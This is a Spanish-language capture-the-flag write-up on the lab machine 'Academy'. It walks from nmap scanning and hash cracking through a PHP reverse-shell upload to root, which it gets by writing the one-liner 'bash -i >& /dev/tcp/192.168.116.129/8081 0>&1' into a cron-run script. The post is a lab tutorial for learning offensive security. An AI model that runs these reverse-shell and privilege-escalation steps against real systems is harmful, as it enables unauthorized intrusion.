---
layout: single
title: Máquina Academy
excerpt: "La máquina Academy es un reto de nivel medio que combina reconocimiento con NMAP y FTP anónimo para extraer información, descubrimiento de rutas ocultas con FFUF, cruce de credenciales MD5 descifradas con Hashcat, subida de un web‑shell para obtener una Reverse Shell y, finalmente, escalada de privilegios local mediante LinPEAS y PSPY para alcanzar root."
date: 2025-07-20
classes: wide
header:
  teaser: /assets/images/2025-07-20-Maquina_Academy/academy_portada.png
  teaser_home_page: true
  icon: # /assets/images/Command-And-Control/ciberAttack.jpg
categories:
  - ctf
tags:  
  - nmap
  - ftp
  - hashcat
  - dirb
  - ffuf
  - php reverse shell
  - linpeas
  - ssh
  - pspy
  - bash reverse shell
---

![](/assets/images/2025-07-20-Maquina_Academy/academy_portada.png)

# IP Academy

```
ip a
```

- La ip de Academy es 192.168.116.132

![](/assets/images/2025-07-20-Maquina_Academy/academy_ip.png)

# NMAP
```
nmap -p- -A -T4 192.168.116.132
```

- La estrategia es: si se ve el Puerto 22 SSH se descartaría , no significa que no tenga opción de ataque, se podría con fuerza bruta, forzar la contraseña y capaz se inicie sesión. 
	- Por lo general en caso de los CTF, SSH no es la ruta prevista. 	
	- Para pentesting , quizás se quiera usar fuerza bruta SSH, porque hay 2 razones:
		- ¿Existe una contraseña débil? ¿Se puede login con user root con una contraseña débil? Si es malo, se dice al cliente que se esta usando contraseñas débiles.
		- Quisiera ver si mi cliente puede detectarte, es decir me detectan cuando estoy ejecutando escaneos brutos. Si se tiene 500 intentos de login SSH y aún puedo hacerlo, eso es un problema para comentarle al cliente.
- Entonces se toma en cuenta el Puerto 21 y 80.

![](/assets/images/2025-07-20-Maquina_Academy/academy_nmap.png)

- En nmap (puerto 80) se ve que una página está trabajando, un server Aparche default, para verlo se ingresa la IP en firefox.
- Esto dice que probablemente se ejecuta PHP en el backend, es un indicador si se ve Apache.
- Si se ve una pagina web default, se puede ver la arquitectura, desde la perspectiva de un hacker es mala higiene.
- Apache es un servidor web muy popular y es comúnmente utilizado en conjunto con PHP para servir aplicaciones web dinámicas.

![](/assets/images/2025-07-20-Maquina_Academy/academy_apache.png)

# FTP
```
ftp 192.168.116.132
anonymous    # de nmap FTP login
anonymous
ls
```

- `ftp`: Establece una conexión FTP (File Transfer Protocol ) con el servidor (target Academy) que tiene la dirección IP 192.168.116.134. Si la conexión tiene éxito, se abrirá una sesión FTP donde podrás interactuar con el servidor remoto para transferir archivos.
- Entonces se conecta, ahora se tiene la capacidad con FTP (Port 21) de poner archivos y obtener archivos (get). Solo se tiene que presentar la solicitud.

![](/assets/images/2025-07-20-Maquina_Academy/academy_ftp.png)

```
get note.txt
```

- `get`: Este comando descargará el archivo "note.txt" desde el servidor FTP a tu directorio local.
- El problema es que no se sabe en que parte de la máquina se almacena esta note.txt
	- Por ejemplo si esto se almacena en https://192.168.116.131/note.txt, se podría subir un malware y así conseguir una shell.
- Para en este caso de CTF solo nos enfocamos en obtener esa nota.

![](/assets/images/2025-07-20-Maquina_Academy/academy_note.png)

```
cat note.txt
```

- Se ve el contenido de note.txt y se ve un password pero en hash.
- Copiamos este hash

![](/assets/images/2025-07-20-Maquina_Academy/academy_password.png)

```
hash-identifier
```

- Herramienta de kali para comprobar si es un hash. Comprobando que si es un MD5 hash. 

![](/assets/images/2025-07-20-Maquina_Academy/academy_hashid.png)

# HASHCAT

- https://www.4armed.com/blog/hashcat-crack-md5-hashes/

- Se busca hashcat que es la herramienta para descifrar la contraseña hash

![](/assets/images/2025-07-20-Maquina_Academy/academy_hashcat.png)

![](/assets/images/2025-07-20-Maquina_Academy/academy_crackmd5.png)

![](/assets/images/2025-07-20-Maquina_Academy/academy_hashcomand.png)

```
locate rockyou.txt
```

- Localizar y asegurarse que este archivo que esta descomprimido (rockyou.txt), en este caso si lo esta, rockyou viene preinstalado en kali.

![](/assets/images/2025-07-20-Maquina_Academy/academy_rockyou.png)

```
mousepad hashes.txt
cd73502828457d15655bbd7a63fb0bc8
```

- Copiar el hash md5 al archivo hashes.txt creado

![](/assets/images/2025-07-20-Maquina_Academy/academy_hashes.png)

```
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

- **`hashcat`**: invoca la herramienta Hashcat, especializada en recuperación de contraseñas por GPU/CPU.
- **`-m 0`**: selecciona el “modo 0” de Hashcat, que corresponde al algoritmo **MD5**.
- **`hashes.txt`**: es el archivo que contiene los hashes a descifrar (uno por línea).
- **`/usr/share/wordlists/rockyou.txt`**: ruta al “wordlist” RockYou, un diccionario muy usado con millones de contraseñas comunes.

- Hecho todo esto se ejecuta hashcat y la contraseña es descifrada es **student**.

![](/assets/images/2025-07-20-Maquina_Academy/academy_hashcatcode.png)

![](/assets/images/2025-07-20-Maquina_Academy/academy_student.png)

- Con todo esto tenemos un usuario y password (student), pero no se tiene idea donde colocar esto.
- Ahora se puede hacer unas conjeturas.
- Al revisar otra vez el contenido de note.txt, se ve academy, es muy probable que en la página web hubiera un /academy

![](/assets/images/2025-07-20-Maquina_Academy/academy_catnote.png)

- Si se usa esta información y se busca http://192.168.116.134/academy nos redirigirá a una página y ya se podría hacer un login.
- Para no hacerlo tan fácil, se buscará esta nueva pagina con las herramientas dirb o ffuf.

![](/assets/images/2025-07-20-Maquina_Academy/academy_academypage.png)

- Se mostrará 2 herramientas que se podrían usar DIRB Y FFUF

# Busqueda directorios
## DIRB

- Para la enumeración de contenido web. Permitirá explorar los directorios y archivos disponibles en el servidor web ubicado en esa dirección IP.
- Es una opción de herramienta, pero FFUF lo hace mejor.

```
dirb http://192.168.116.134
```

![](/assets/images/2025-07-20-Maquina_Academy/academy_dirb.png)

## FFUF

- Se utiliza para la búsqueda de directorios y archivos ocultos en un servidor web, similar a lo que hace dirb.
	
```
sudo apt install ffuf
```

![](/assets/images/2025-07-20-Maquina_Academy/academy_ffuf.png)

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.116.134/FUZZ
```

- `ffuf`: Lee cada palabra de la lista y la inyecta en lugar de `FUZZ`, para descubrir directorios y ficheros no documentados.
- `-w`: Especifica el diccionario de palabras a utilizar.
- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`: Se recomienda usar medium. Este archivo contiene una lista de nombres comunes de directorios y archivos que se probarán.
- `:FUZZ`: Define el marcador de posición (FUZZ) que se utilizará en la URL objetivo. ffuf reemplazará FUZZ con cada palabra del diccionario.
- `-u`: Especifica la URL objetivo.
- `http://192.168.116.134/FUZZ`: La URL donde FUZZ será reemplazado por cada palabra del diccionario.

![](/assets/images/2025-07-20-Maquina_Academy/academy_ffufcode.png)

- Se obtuvo 301 de academy y phpmyadmin, así que hay una redirección allí.
- 301 (Moved Permanently): Este código de estado indica que el recurso solicitado ya no está disponible en la URL actual y ha sido movido permanentemente a una nueva URL.
- Se descubre los directorios /academy y /phpmyadmin. 

![](/assets/images/2025-07-20-Maquina_Academy/academy_ffufacademy.png)

- Directorio encontrado 192.168.116.132/phpmyadmin. Con esto se asegura que en el backend esta corriendo php.

![](/assets/images/2025-07-20-Maquina_Academy/academy_pagephp.png)

- Directorio encontrado 192.168.116.132/academy
- Se lee de nuevo text.txt para saber las credenciales e ingresar.

![](/assets/images/2025-07-20-Maquina_Academy/academy_loginacademy.png)

- Al ingresar, observamos algo muy interesante, en la web se puede cargar una foto.
- Con esto se puede hacer un ataque cargando un shell inverso.

![](/assets/images/2025-07-20-Maquina_Academy/academy_myprofile.png)

- Se quiere saber si se puede subir algo que no sea una foto (jpg, png) y abusar del archivo sistema de carga.
- Lo que se puede hacer es intentar carga un Shell inverso y ver si se puede recuperar conexión.
- Ahora se sabe que esto es Apache, así que se cargará a través de PHP.

# PHP Reverse Shell

- https://github.com/pentestmonkey/php-reverse-shell/tree/master

- Se busca el php reverse shell

![](/assets/images/2025-07-20-Maquina_Academy/academy_phpgoogle.png)

- Click cuadro rojo

![](/assets/images/2025-07-20-Maquina_Academy/academy_phpgithub.png)

- Click Raw 

![](/assets/images/2025-07-20-Maquina_Academy/academy_rawphp.png)

- Copiar todo el contenido

![](/assets/images/2025-07-20-Maquina_Academy/academy_phpcode.png)

```
mousepad shell.php
```

- Se pega el texto copiado al archivo creado shell.php

![](/assets/images/2025-07-20-Maquina_Academy/academy_mousepadshell.png)

```
192.168.116.128     # ip atacante
```

- Configuración de mi ip (atacante)

![](/assets/images/2025-07-20-Maquina_Academy/academy_ipshell.png)

```
nc -nvlp 1234
```

- Nuestra máquina se pone en modo escucha a esperar algo.

![](/assets/images/2025-07-20-Maquina_Academy/academy_nc1234.png)

- Ahora se sube el archivo php Reverse Shell desde la web de /academy.

![](/assets/images/2025-07-20-Maquina_Academy/academy_shellupload.png)

```
whoami
sudo -l
```

- `sudo -l`: sirve para **listar las reglas de sudo** que tiene asignadas el usuario actual
- Entonces conseguimos la shell de Academy, pero aún no somos root.
- Se necesita una escalada de privilegios.

![](/assets/images/2025-07-20-Maquina_Academy/academy_ncwhoami.png)

# Escalada de Privilegios
## LinPEAS

- https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

- Script de código abierto diseñado para automatizar la búsqueda de posibles vulnerabilidades de escalada de privilegios en sistemas Linux/Unix/MacOS. Es una herramienta desarrollada por **[Carlos Polop](https://github.com/carlospolop)** , investigador de ciberseguridad y experto en pruebas de penetración, y es ampliamente utilizada por administradores de sistemas y auditores de seguridad para identificar y abordar vulnerabilidades antes de que puedan ser explotadas por atacantes.

![](/assets/images/2025-07-20-Maquina_Academy/academy_linpeasgoogle.png)

![](/assets/images/2025-07-20-Maquina_Academy/academy_linpeascode.png)

```
mkdir transfer
cd transfer
mousepad linpeas.sh
```

- Se pega el código en el archivo creado linpeas.sh en una carpeta transfer.

![](/assets/images/2025-07-20-Maquina_Academy/academy_mousepadlinpeas.png)

```
python3 -m http.server 80
```

- **`-m http.server`**: utiliza el módulo integrado de Python para HTTP
- **`80`**: indica el puerto (privilegiado) donde escuchar
- Ahora se va alojar un server web en la carpeta /transfer.

![](/assets/images/2025-07-20-Maquina_Academy/academy_python3.png)

```
cd /tmp
```

- Un buen lugar para colocar un archivo que se quiere volcar en la máquina víctima es en /tmp (carpeta temporal).

![](/assets/images/2025-07-20-Maquina_Academy/academy_cdtmp.png)

```
wget http://192.168.116.129/linpeas.sh
```

- **`wget`**: Para descargar un fichero desde la URL indicada.
- **`http://192.168.116.129/linpeas.sh`**: Es la URL donde está el script **linPEAS** (o una copia de éste) en esa máquina.

- wget hace la transferencia del archivo linpeash.sh desde nuestra maquina atacante al shell de la máquina víctima.

![](/assets/images/2025-07-20-Maquina_Academy/academy_wgetlinpeas.png)

- Al aplicar el comando wget, se puede ver la terminal atacante la transferencia del archivo linpeas.sh

![](/assets/images/2025-07-20-Maquina_Academy/academy_python3get.png)

```
chmod +x linpeas.sh
```

- Se otorga permiso ejecución a linpeas.sh y se ejecuta.

![](/assets/images/2025-07-20-Maquina_Academy/academy_chmodlinpeas.png)

```
./linpeas.sh
```

![](/assets/images/2025-07-20-Maquina_Academy/academy_linpeasrun.png)

- Rojo/Amarillo significa 95% que podría ser un vector de escalada de privilegios (PE).

![](/assets/images/2025-07-20-Maquina_Academy/academy_linpeasvector.png)

- Se toma NOTA: 
`* * * * * /home/grimmie/backup.sh`, 95% que sea vector PE
- Significa que **cada minuto** Cron ejecutará el script `/home/grimmie/backup.sh`.
- `* * * * *`: Ejecuta el trabajo en cada minuto de cada hora de cada día del mes de cada mes y cada día de la semana.

![](/assets/images/2025-07-20-Maquina_Academy/academy_linpeasbackup.png)

- Se toma NOTA: 
- /var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss"

![](/assets/images/2025-07-20-Maquina_Academy/academy_linpeaspassword.png)

```
cat /var/www/html/academy/admin/includes/config.php
```

- En las notas aparecía grimmie, era un indicador que nos enfrentábamos a un user llamado grimmie. 
- Ahora tenemos su contraseña y podríamos iniciar sesión con este usuario mediante SSH.

![](/assets/images/2025-07-20-Maquina_Academy/academy_usergrimmie.png)

### SSH

```
ssh grimmie@192.168.116.132    # ip target
My_V3ryS3cur3_P4ss
```

- **`ssh`**: Proporciona un método seguro para iniciar sesión en otro equipo a través de una red, ejecutar comandos de forma remota y transferir archivos entre máquinas.
- Password: My_V3ryS3cur3_P4ss
- Con esto se accede a Academy con el usuario grimmie.

![](/assets/images/2025-07-20-Maquina_Academy/academy_sshgrimmie.png)

```
history
```

- Algunos comandos de comprobación comunes que se hacen son:

![](/assets/images/2025-07-20-Maquina_Academy/academy_history1.png)

![](/assets/images/2025-07-20-Maquina_Academy/academy_history2.png)

```
cd /home/grimmie
ls
cat backup.sh
```

- Saltando todo el proceso anterior, nos enfocamos en el archivo de interés, que sería backup.sh (de las NOTAS).
- Nos encontramos con un archivo backup.sh, el contenido de este me dice que probablemente este saliendo y haciendo periódicamente comprobaciones o se ejecuta periódicamente un script.
- Este script **automatiza un respaldo** de la carpeta crítica de tu aplicación web y lo deja seguro en `/tmp`:
	- **Elimina** cualquier ZIP viejo (`rm /tmp/backup.zip`).
    - **Crea** un nuevo archivo comprimido (`zip -r`) de `/var/www/html/academy/includes` en `/tmp/backup.zip`.
    - **Restringe** los permisos (`chmod 700`) para que sólo el propietario pueda acceder al backup.

![](/assets/images/2025-07-20-Maquina_Academy/academy_catbackup.png)

```
systemctl list-timers
```

- `systemctl`: Su función es **mostrar los temporizadores (timers) configurados**. Con él puedes ver qué tareas programadas hay, cuándo se ejecutaron por última vez y cuándo volverán a dispararse.
- Se observa si hay algún script ejecutándose que este en un timer, pero no se ve el backup.sh que buscamos.
- Para estas situaciones, está la herramienta **pspy** para darnos información de lo que se esta ejecutando.

![](/assets/images/2025-07-20-Maquina_Academy/academy_systemctl.png)

## PSPY

- https://github.com/DominicBreuker/pspy/tree/master

- Herramienta poderosa para la post-explotación y la enumeración, diseñada para espiar **procesos en ejecución** sin necesidad de privilegios elevados. Es particularmente útil para descubrir actividades sospechosas, tareas cron, scripts que se ejecutan automáticamente y otros procesos que pueden ser explotados para la escalada de privilegios.

- Si queremos validación y confirmación de que esto se está ejecutando con un timer.

![](/assets/images/2025-07-20-Maquina_Academy/academy_pspy1.png)

![](/assets/images/2025-07-20-Maquina_Academy/academy_pspy2.png)

```
mv Downloads/pspy64 transfer
```

- Se movió el archivo descargado al directorio transfer.

![](/assets/images/2025-07-20-Maquina_Academy/academy_dowloadspspy.png)

![](/assets/images/2025-07-20-Maquina_Academy/academy_lspspy.png)

```
cd /tmp
wget http://192.168.116.128/pspy64    
```

- Pasamos el archivo pspy64 a la shell de academy.

![](/assets/images/2025-07-20-Maquina_Academy/academy_wgetpspy.png)

- Al aplicar el comando wget, en la terminal local se ve la transferencia del archivo pspy64

![](/assets/images/2025-07-20-Maquina_Academy/academy_python3pspy.png)

- Se ve que ya se transfirió el archivo pspy64

![](/assets/images/2025-07-20-Maquina_Academy/academy_pspytmp.png)

```
chmod +x pspy64
./pspy64
```

- Nos muestra todos los procesos que se ejecutan en la máquina.
- Todo lo que se tiene hacer es buscar con la herramienta pspy64 el backup.sh ejecutándose.
- Y se observa que si se ejecuta cada minuto.

![](/assets/images/2025-07-20-Maquina_Academy/academy_runpspy.png)

![](/assets/images/2025-07-20-Maquina_Academy/academy_pspybackup.png)

```
cd /home/grimmie
```

- Regresamos al /home/grimmie para volver con el archivo backup.sh encontrado.

![](/assets/images/2025-07-20-Maquina_Academy/academy_lsbackup.png)

# bash Reverse shell one liner

- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

- Ahora se busca en google.

![](/assets/images/2025-07-20-Maquina_Academy/academy_bashreverse.png)

- Pondremos esto en el archivo backup.sh que ya se tiene.
- Todo esto para obtener una shell inversa, porque ya vimos que con la herramienta PSPY, backup.sh se ejecuta cada minuto.

![](/assets/images/2025-07-20-Maquina_Academy/academy_reversebash.png)

```
nc -nlvp 8081
```

- Poner 8081, porque ya se puso antes y existe la posibilidad que el port 80 este ahí afuera (si lo esta).

![](/assets/images/2025-07-20-Maquina_Academy/academy_nc8081.png)

```
nano backup.sh
```

- Abrir el archivo backup.sh y borrar el contenido.

![](/assets/images/2025-07-20-Maquina_Academy/academy_nanobackup.png)

```
bash -i >& /dev/tcp/192.168.116.129/8081 0>&1
```

- Colocar está línea encontrada en google, en backup.sh
- Esto llamará a nuestra dirección IP

![](/assets/images/2025-07-20-Maquina_Academy/academy_bashcode.png)

- Cuando se ejecuta el script anterior, se obtiene una shell root.

![](/assets/images/2025-07-20-Maquina_Academy/academy_rootacademy.png)

```
whoami
cd /root
ls
cat flag.txt
```

- Finalmente se obtiene la flag.

![](/assets/images/2025-07-20-Maquina_Academy/academy_flag.png)

# Resumen

![](/assets/images/2025-07-20-Maquina_Academy/academy_resumen.png)

- *Autor: marcelosec*
